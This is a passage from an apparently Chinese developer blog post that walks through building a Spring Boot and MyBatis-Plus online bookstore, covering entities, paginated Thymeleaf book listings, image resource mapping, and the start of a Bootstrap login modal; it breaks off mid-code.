2*8GB</td></tr><tr><td>软件资源</td><td>系统后台开发工具</td><td>OpenJDK1.8.0_201</td></tr><tr><td></td><td></td><td>IDEA2022.2.3</td></tr><tr><td></td><td>Web应用服务器</td><td>Tomcat-8.5.47</td></tr><tr><td></td><td>数据库服务器</td><td>Mysql-8.0.33</td></tr><tr><td></td><td>前端技术</td><td>HTML、CSS、JavaScript、bootstrap、themleaf</td></tr><tr><td></td><td>后端技术</td><td>SpringBoot、mybatis-plus、Java</td></tr><tr><td></td><td>测试浏览器</td><td>Chrome、FireFox</td></tr></tbody></table><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps2.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps2.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps3.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps3.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps4.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps4.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p><h2 id="设计效果图"><a href="#设计效果图" class="headerlink" title="设计效果图"></a>设计效果图</h2><p>首页：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps5.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps5.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p><p>图书分类展示页：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps6.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps6.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p><p>登录模态框：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps6.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps6.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p><p>注册模态框：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps7.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps7.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p><p>图书详情页：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps8.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps8.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p><p>我的购物车页：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps9.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps9.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p><p>确认订单界面及添加收货地址模态框</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps10.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps10.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p><p>历史订单页：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps11.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps11.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></p><h1 id="安知楼"><a href="#安知楼" class="headerlink" title="安知楼"></a>安知楼</h1><h2 id="数据库及mybatis-CRUD"><a href="#数据库及mybatis-CRUD" class="headerlink" title="数据库及mybatis CRUD"></a>数据库及mybatis CRUD</h2><p>1.先把数据库制作好，这里用的navicat</p><p>表的结构如下：</p><ul><li>bs_user为用户信息，bs_book为书籍信息，bs_cart为购物车信息，bs_addr为用户地址</li><li>bs_order_item为订单结算信息展示，bs_order为历史订单信息<img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425155127713.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425155127713.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230425155127713"></li></ul><p>entity下定义了实体类</p><ul><li>如Book实体类，对应了数据库的bs_book，每个字段对应声明，用lombok的@Data注解自动生成setter,getter,toString</li><li>使用mybatis-plus的@TableName注解声明实体类对应的数据表，使用mybatis声明的类还需要继承com.baomidou.mybatisplus.extension.activerecord.Model，&lt;实体类&gt;填类名Book</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425160942239.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425160942239.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230425160942239"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425160329859.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425160329859.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230425160329859"></p><ul><li>数据表的主键（bs_book里指id）需要用@TableId注解</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425160416173.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425160416173.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230425160416173"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425160438850.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425160438850.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230425160438850"></p><p>这里category字段我想做到的效果是对图书分为精选，推荐和特价，所以做了mybatis的枚举定义</p><p>后续对实体类进行CRUD操作需要继承Mapper接口，这里在mapper包下定义BookMapper</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425171758792.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425171758792.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230425171758792"></p><p>定义图书业务层的BookService只需要继承ServiceImpl然后加上@Service注解就行了，在官方文档能看到该接口的定义</p><p><a href="https://gitee.com/baomidou/mybatis-plus/blob/3.0/mybatis-plus-extension/src/main/java/com/baomidou/mybatisplus/extension/service/IService.java">https://gitee.com/baomidou/mybatis-plus/blob/3.0/mybatis-plus-extension/src/main/java/com/baomidou/mybatisplus/extension/service/IService.java</a></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230428162440520.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230428162440520.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230428162440520"></p><p>编写springboot的测试类来输出数据库中书的信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kaibook.anzfloor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.kaibook.anzfloor.service.BookService;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AnzfloorApplicationTests</span> &#123;</span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> BookService bookService;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">findBookList</span><span class="params">()</span> &#123;</span><br><span class="line">bookService.list().forEach(System.out::println);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230428170929503.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230428170929503.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230428170929503"></p><p>成功输出，也就是说明book实体类和数据库成功打通通道</p><h3 id="静态文件概述"><a href="#静态文件概述" class="headerlink" title="静态文件概述"></a>静态文件概述</h3><p>静态文件使用thymeleaf渲染时只会执行后面的th:{}</p><p>静态文件解析：</p><p>bookModal:前端的登录注册，负责表单的提交</p><blockquote><p>div标签内容：tabindex&#x3D;-1表示元素可聚焦 role用来做辅助工具的识别，这里用bootstrap的dialog，起到一个弹出框的效果</p><p><code>aria-labelledby</code>  属性用于将一个或多个标签与当前元素进行关联，从而提供辅助功能用户所需的信息。在这个特定的例子中， <code>aria-labelledby</code>  属性指定了  <code>div</code>  元素的 ID，该  <code>div</code>  元素包含了用于登录模态框的标题。这个属性的作用是告诉屏幕阅读器和其他辅助功能的用户，该  <code>div</code>  元素的内容与哪个元素相关联，以便用户在使用该元素时能够获得正确的上下文</p><p>aria-hidden&#x3D;”true”表示该元素对于屏幕阅读器用户不可见</p></blockquote><p>carousel：图片轮播</p><p>footer：页脚</p><p>header:导航栏</p><p>index：首页</p><p>bookDate:显示图书列表</p><h2 id="Book信息展示"><a href="#Book信息展示" class="headerlink" title="Book信息展示"></a>Book信息展示</h2><p>首页类用BookController实现，加@RequestMapping注解做url映射</p><p>在index.html中，定义了一个函数来使用jQuery.load()来加载页的数据，用contextPath+&#x2F;book&#x2F;getBookData做url</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510172919337.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510172919337.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230510172919337"></p><p>如下函数，就是展示第一页</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">   $(<span class="string">&quot;#selected&quot;</span>).<span class="title function_">load</span>(contextPath + <span class="string">&quot;/book/getBookData&quot;</span>,<span class="title function_">buildQuery</span>(<span class="number">1</span>,<span class="number">1</span>));</span><br><span class="line">   $(<span class="string">&quot;#recommend&quot;</span>).<span class="title function_">load</span>(contextPath + <span class="string">&quot;/book/getBookData&quot;</span>,<span class="title function_">buildQuery</span>(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">   $(<span class="string">&quot;#bargain&quot;</span>).<span class="title function_">load</span>(contextPath + <span class="string">&quot;/book/getBookData&quot;</span>,<span class="title function_">buildQuery</span>(<span class="number">1</span>,<span class="number">3</span>));</span><br><span class="line">         &#125;)</span><br></pre></td></tr></table></figure><p>其中context用javascript的来从request中进行获取应用路径</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> contextPath = [[$&#123;#request.<span class="title function_">getContextPath</span>()&#125;]];</span><br></pre></td></tr></table></figure><p>声明函数buildQuery()来返回页数和分类（如果undefined就是第一页，如果不是的话就是page，page会在后面用iPage.getCurrent()来进行控制)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">buildQuery</span><span class="params">(page,category)</span> &#123;</span><br><span class="line"><span class="type">var</span> <span class="variable">query</span> <span class="operator">=</span> &#123;&#125;;</span><br><span class="line">query.page = typeof page == <span class="string">&quot;undefined&quot;</span> ? <span class="number">1</span> : page;</span><br><span class="line">query.category = category;</span><br><span class="line"><span class="keyword">return</span> query;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>然后在bookController里做路径映射，结果返回到bookData，在bookData里做图书展示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/getBookData&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getBookData</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;bookData&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的数据控制用model实现：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510173528012.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510173528012.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230510173528012"></p><p>网页请求一个RequestMapping时，如果目标有model参数，就会带上整个网页作为model</p><p>参数用spring.ui的Model封装模型数据。由于要实现分页功能，用IPage对象获取数据，由于需要使用mybatis service的方法，所以这里需要定义bookService的接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mybatis分页</span></span><br><span class="line">IPage&lt;Book&gt; iPage  = bookService.page(<span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(<span class="number">1</span>,<span class="number">4</span>),<span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;.eq(<span class="string">&quot;category&quot;</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这里用1,4就是第一页，4组数据</p><p>用<code>bookService.page(new Page&lt;&gt;(page,4),queryWrapper)</code>进行定义的时候，页就按分类给定义好了，只需要接收几个参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getBookData</span><span class="params">(Model model,Integer page,Integer category)</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在model里用addAttribute向bookList存放数据库数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.addAttribute(<span class="string">&quot;bookList&quot;</span>,iPage.getRecords());</span><br></pre></td></tr></table></figure><p>因为每个分类都是一样的，所以用th:each&#x3D;”book:${bookList}”进行遍历，然后用th:text&#x3D;””进行取值（简化数据库操作），book做子循环变量，存放一条数据，比如${book.name}就对应了数据库的name<img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510164650155.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510164650155.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230510164650155"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510163903403.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510163903403.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230510163903403"></p><p>再定义一下上一页和下一页：前端用事件th:onclick&#x3D;””调用loadData来进行翻页</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;|loadData(&#123;$pre&#125;,&#123;$category&#125;)&quot;</span>&gt;</span>上一页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;|loadData(&#123;$next&#125;,&#123;$category&#125;)&quot;</span>&gt;</span>下一页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在首页实现loadData(加载其他页)的功能：参数为页码和分类，调用之前定义的三个函数（该大标题刚开始的地方）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">loadData</span><span class="params">(page,category)</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> node;</span><br><span class="line">    <span class="keyword">if</span>(category == <span class="number">1</span>)&#123;</span><br><span class="line">        node = <span class="string">&quot;selected&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(category == <span class="number">2</span>) &#123;</span><br><span class="line">        node = <span class="string">&quot;recommend&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    node = <span class="string">&quot;bargain&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">                $(<span class="string">&quot;#&quot;</span> + node).load(contextPath + <span class="string">&quot;/book/getBookData&quot;</span>,buildQuery(page,category));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="翻页控制"><a href="#翻页控制" class="headerlink" title="翻页控制"></a>翻页控制</h3><p>同样的，在java代码里加上加减页的功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">model.addAttribute(<span class="string">&quot;pre&quot;</span>,iPage.getCurrent()-<span class="number">1</span>);</span><br><span class="line">model.addAttribute(<span class="string">&quot;next&quot;</span>,iPage.getCurrent()+<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>为防止页码溢出（超出页上限），定义一个cur表示当前页，last表示最后一页（总页数）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">model.addAttribute(<span class="string">&quot;cur&quot;</span>,iPage.getCurrent());</span><br><span class="line">model.addAttribute(<span class="string">&quot;pages&quot;</span>,iPage.getPages());</span><br></pre></td></tr></table></figure><p>在bookData进行翻页的部分，th:style&#x3D;’pointer-events:none’就会使“下一页”这个按钮不可用</p><p>所以完整的上下页的句子就是：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">th:style</span>=<span class="string">&quot;$&#123;cur == 1&#125; ? &#x27;pointer-events:none&#x27; : &#x27;&#x27;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;|loadData($&#123;pre&#125;,$&#123;category&#125;)|&quot;</span>&gt;</span><span class="symbol">&amp;larr;</span>上一页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">th:style</span>=<span class="string">&quot;$&#123;cur == last&#125;  ? &#x27;pointer-events:none&#x27; : &#x27;&#x27;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;|loadData($&#123;next&#125;,$&#123;category&#125;)|&quot;</span>&gt;</span>下一页 <span class="symbol">&amp;rarr;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="图片显示"><a href="#图片显示" class="headerlink" title="图片显示"></a>图片显示</h3><p>图片名要与数据库的image_urls一致</p><p>用WebMvcConfig类重写WebMvcConfigurer接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebMvcConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addResourceHandlers</span><span class="params">(ResourceHandlerRegistry registry)</span>&#123;</span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;/public/**&quot;</span>).addResourceLocations(<span class="string">&quot;file://E:\\BaiduNetdiskDownload\\book-shop\\book-shop\\src\\main\\resources\\static\\images\\&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对本地图片文件做映射，映射到web应用的&#x2F;public&#x2F;目录下</p><p>在bookData目录下，就能用如下html插入图片</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">th:src</span>=<span class="string">&quot;@&#123;&#x27;/public/&#x27; + $&#123;book.imgUrl&#125;&#125;&gt;</span></span></span><br></pre></td></tr></table></figure><p>到这一步完成了从数据库中获取图书信息，用实体类book和对应的controller，利用model完成前后端数据的传递。核心的bookcontroller代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/book&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BookService bookService;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取图书信息</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/getBookData&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getBookData</span><span class="params">(Model model ,Integer page,Integer category)</span>&#123;</span><br><span class="line">        QueryWrapper&lt;Book&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">        queryWrapper.eq(<span class="string">&quot;category&quot;</span>,category);</span><br><span class="line">        IPage&lt;Book&gt; iPage  = bookService.page(<span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(page,<span class="number">4</span>),queryWrapper);</span><br><span class="line">        model.addAttribute(<span class="string">&quot;bookList&quot;</span>,iPage.getRecords());</span><br><span class="line">        model.addAttribute(<span class="string">&quot;cur&quot;</span>,iPage.getCurrent());</span><br><span class="line">        model.addAttribute(<span class="string">&quot;last&quot;</span>,iPage.getPages());</span><br><span class="line">        model.addAttribute(<span class="string">&quot;pre&quot;</span>,iPage.getCurrent()-<span class="number">1</span>);</span><br><span class="line">        model.addAttribute(<span class="string">&quot;next&quot;</span>,iPage.getCurrent()+<span class="number">1</span>);</span><br><span class="line">        model.addAttribute(<span class="string">&quot;category&quot;</span>,category);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;bookData&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试页面：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510210705729.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510210705729.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230510210705729"></p><h2 id="注册功能"><a href="#注册功能" class="headerlink" title="注册功能"></a>注册功能</h2><p>登录注册的前端，这里是用的bootstrap的模态框：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modal fade&quot;</span> <span class="attr">id</span>=<span class="string">&quot;loginModal&quot;</span> <span class="attr">tabindex</span>=<span class="string">&quot;-1&quot;</span> <span class="attr">role</span>=<span class="string">&quot;dialog&quot;</span> <span class="attr">aria-labelledby</span>=<span class="string">&quot;loginModalLabel&quot;</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>表单的username部分：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入用户名&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其他的密码，邮箱等都相同</p><p>最后的登录botton是调用了自定义的一个login函数进行发送表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;|login()|&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在login_reg.js里对login函数进行定义：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">login</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> datas = $(<span class="string">&quot;#loginForm&quot;</span>).<span class="title function_">serialize</span>();</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: contextPath + <span class="string">&quot;/user/login&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>:datas,</span><br><span class="line">        <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">        <span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">            $(<span class="string">&quot;#userTip&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;none&quot;</span>);</span><br><span class="line">            $(<span class="string">&quot;#pwdTip&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;none&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(data == <span class="number">100</span>)&#123;</span><br><span class="line">                $(<span class="string">&quot;#loginModal&quot;</span>).<span class="title function_">modal</span>(<span 